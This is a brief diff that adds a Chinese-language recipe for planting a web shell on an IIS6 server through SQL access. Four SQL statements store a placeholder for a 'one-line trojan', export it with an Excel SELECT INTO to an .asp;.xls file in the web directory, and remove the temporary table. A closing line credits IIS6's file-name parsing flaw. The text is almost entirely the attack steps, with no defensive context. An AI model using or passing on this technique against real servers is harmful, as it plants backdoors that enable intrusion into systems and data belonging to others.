@@ -1,0 +1,10 @@
+第一句代码
+create table cmd (a varchar(50))  
+第二句代码
+insert into cmd (a) values ('一句话木马')  
+第三句代码
+select * into [a] in 'e:\host\chouwazi.com\web\data\xiao.asp;xiao.xls' 'excel 4.0;' from cmd  
+第四句代码
+drop table cmd  
+
+原理还是利用iis6的解析漏洞才能成功！
